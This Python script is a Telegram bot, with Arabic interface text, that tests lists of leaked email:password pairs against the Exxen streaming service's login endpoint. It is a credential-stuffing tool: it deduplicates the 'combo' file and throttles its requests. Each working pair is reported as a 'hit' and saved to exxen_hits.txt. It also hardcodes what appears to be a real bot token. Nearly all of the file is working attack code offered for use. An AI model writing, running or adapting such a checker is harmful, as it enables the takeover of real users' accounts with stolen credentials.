#!/usr/bin/env python3
# Exxen Checker Bot — With Stop Button
# pip install python-telegram-bot requests cfonts

import asyncio
import base64
import requests
import os
from cfonts import render
from telegram import Update, InlineKeyboardButton, InlineKeyboardMarkup
from telegram.ext import Application, CommandHandler, MessageHandler, CallbackQueryHandler, filters, ContextTypes
from telegram.request import HTTPXRequest
from telegram.error import TimedOut, NetworkError

# ==========================================
# CONFIGURATION
# ==========================================
BOT_TOKEN = "5804877719:AAEHFYJLOjQ3HuZTIDIMwoD0zFsRzXRMHEs"
ADMIN_ID = 5870967455

# ==========================================
# GLOBAL STATE
# ==========================================
IS_CHECKING = False

# ==========================================
# TERMINAL UI (Banner)
# ==========================================
def show_banner():
    os.system('clear')
    print("\n")
    banner = render('Exxen', colors=['white', 'blue'], align='center')
    print(banner)
    print("━" * 60)
    print("  [+] Bot Status: ONLINE")
    print("  [+] Engine: Async Task Mode")
    print("  [+] Deduplication: ACTIVE")
    print("  [+] Terminal Logs: DISABLED (Check Telegram)")
    print("━" * 60)
    print("\n[*] Waiting for combo file via Telegram...\n")

# ==========================================
# CHECKER ENGINE
# ==========================================
def check_exxen_account(mail, pas):
    try:
        enc = requests.Session()
        auth_str = base64.b64encode(f"{mail}:{pas}".encode()).decode()
        
        response = enc.post('https://mw-proxy.app.exxen.com/user/login', json={
            "deviceDetails": {
                "deviceName": "Chrome",
                "deviceType": "Desktop",
                "modelNo": "131.0.0.0",
                "serialNo": "131.0.0.0",
                "brand": "Chrome",
                "os": "Windows",
                "osVersion": "10"
            }
        }, headers={
            'Authorization': f'Basic {auth_str}',
            'Content-Type': 'application/json'
        }, timeout=15)
        
        return response.status_code == 200
            
    except Exception:
        return False

# ==========================================
# ASYNC BACKGROUND PROCESS
# ==========================================
async def process_combos(update: Update, context: ContextTypes.DEFAULT_TYPE, file_bytes: bytes):
    global IS_CHECKING
    IS_CHECKING = True
    
    chat_id = update.effective_chat.id
    seen_combos = set()
    hits = 0
    checked = 0

    try:
        text_data = file_bytes.decode('utf-8')
    except UnicodeDecodeError:
        text_data = file_bytes.decode('utf-8', errors='ignore')

    lines = text_data.splitlines()
    
    valid_lines = []
    for line in lines:
        line = line.strip()
        if line and ":" in line and line not in seen_combos:
            seen_combos.add(line)
            valid_lines.append(line)

    total = len(valid_lines)

    if total == 0:
        await context.bot.send_message(chat_id=chat_id, text="⚠️ **الملف فارغ أو لا يحتوي على تنسيق صحيح (mail:pass).**", parse_mode="Markdown")
        IS_CHECKING = False
        return

    # زر الإيقاف
    stop_kb = InlineKeyboardMarkup([
        [InlineKeyboardButton("🛑 إيقاف الفحص", callback_data="stop_checking")]
    ])

    status_msg = await context.bot.send_message(
        chat_id=chat_id,
        text=f"⏳ **بدء الفحص...**\n\n🔍 الإجمالي: `0/{total}`\n🎯 الشغال: `0`",
        reply_markup=stop_kb,
        parse_mode="Markdown"
    )

    for line in valid_lines:
        # التحقق من حالة الإيقاف
        if not IS_CHECKING:
            break
            
        try:
            mail, pas = line.split(':', 1)
            mail = mail.strip()
            pas = pas.strip()
            
            is_valid = await asyncio.to_thread(check_exxen_account, mail, pas)
            
            checked += 1
            
            if is_valid:
                hits += 1
                hit_msg = (
                    f"✅ **Exxen Hit Found!**\n\n"
                    f"📧 **Mail:** `{mail}`\n"
                    f"🔑 **Pass:** `{pas}`\n\n"
                    f"📊 Checked: {checked}/{total} | Hits: {hits}"
                )
                await context.bot.send_message(chat_id=chat_id, text=hit_msg, parse_mode="Markdown")
                
                with open("exxen_hits.txt", "a", encoding="utf-8") as f:
                    f.write(f"{mail}:{pas}\n")
            
            if checked % 5 == 0 or checked == total:
                try:
                    await status_msg.edit_text(
                        text=f"⏳ **جاري الفحص...**\n\n🔍 الإجمالي: `{checked}/{total}`\n🎯 الشغال: `{hits}`",
                        reply_markup=stop_kb,
                        parse_mode="Markdown"
                    )
                except Exception:
                    pass
            
            await asyncio.sleep(1.5)
            
        except Exception:
            pass
            
    # رسالة النهاية
    if IS_CHECKING:
        final_text = f"🏁 **تم الانتهاء!**\n\n📁 إجمالي الحسابات: `{total}`\n🔍 تم فحص: `{checked}`\n🎯 الشغال: `{hits}`"
    else:
        final_text = f"🛑 **تم إيقاف الفحص يدوياً!**\n\n📁 الإجمالي: `{total}`\n🔍 تم فحص: `{checked}`\n🎯 الشغال: `{hits}`"
        
    await status_msg.edit_text(
        text=final_text,
        parse_mode="Markdown"
    )
    
    IS_CHECKING = False

# ==========================================
# TELEGRAM HANDLERS
# ==========================================
async def start(update: Update, context: ContextTypes.DEFAULT_TYPE):
    if update.effective_user.id != ADMIN_ID:
        return
    text = (
        "👁️ **Exxen Checker Bot**\n\n"
        "أرسل ملف الكومبو (`.txt`) وسأقوم بفحصه فوراً.\n"
        "ستظهر لك واجهة الفحص مباشرة في الشات مع زر إيقاف."
    )
    await update.message.reply_text(text, parse_mode="Markdown")

async def handle_document(update: Update, context: ContextTypes.DEFAULT_TYPE):
    global IS_CHECKING
    
    if update.effective_user.id != ADMIN_ID:
        return
        
    if IS_CHECKING:
        await update.message.reply_text("⚠️ **يوجد فحص قيد التشغيل حالياً.**\nاضغط على زر (إيقاف الفحص) أولاً.")
        return
        
    doc = update.message.document
    if not doc.file_name.endswith('.txt'):
        await update.message.reply_text("❌ Please send a `.txt` file.")
        return

    msg = await update.message.reply_text("⏳ Downloading...")
    
    try:
        new_file = await context.bot.get_file(doc.file_id)
        file_bytes = await new_file.download_as_bytearray()
        
    except TimedOut:
        await msg.edit_text("❌ **فشل تحميل الملف (انتهت مهلة الشبكة).**\nتأكد من قوة اتصالك بالإنترنت وحاول إرسال الملف مرة أخرى.")
        return
    except NetworkError as e:
        await msg.edit_text(f"❌ **مشكلة في الاتصال بتلجرام:**\n`{e}`")
        return
    except Exception as e:
        await msg.edit_text(f"❌ **خطأ غير متوقع أثناء التحميل:**\n`{e}`")
        return

    await msg.delete()
    asyncio.create_task(process_combos(update, context, bytes(file_bytes)))

async def stop_check(update: Update, context: ContextTypes.DEFAULT_TYPE):
    global IS_CHECKING
    query = update.callback_query
    await query.answer()
    
    if query.from_user.id != ADMIN_ID:
        return

    if IS_CHECKING:
        IS_CHECKING = False
        await query.edit_message_text("🛑 **جاري إيقاف الفحص...**", parse_mode="Markdown")
    else:
        await query.edit_message_text("⚠️ **لا يوجد فحص قيد التشغيل حالياً.**", parse_mode="Markdown")

# ==========================================
# ERROR HANDLER
# ==========================================
async def error_handler(update: Update, context: ContextTypes.DEFAULT_TYPE) -> None:
    if isinstance(context.error, TimedOut):
        print(f"[!] Network Timeout occurred.")
    else:
        print(f"[!] Exception while handling an update: {context.error}")

# ==========================================
# LAUNCHER
# ==========================================
def main():
    show_banner()
    
    request = HTTPXRequest(
        connect_timeout=120.0,
        read_timeout=120.0,
        write_timeout=120.0,
        pool_timeout=120.0
    )
    
    app = (
        Application.builder()
        .token(BOT_TOKEN)
        .request(request)
        .build()
    )
    
    app.add_handler(CommandHandler("start", start))
    app.add_handler(MessageHandler(filters.Document.ALL, handle_document))
    app.add_handler(CallbackQueryHandler(stop_check, pattern="^stop_checking$"))
    app.add_error_handler(error_handler)
    
    print("[*] Bot is polling. Send the combo file...")
    app.run_polling(close_loop=False, bootstrap_retries=5)

if __name__ == "__main__":
    main()
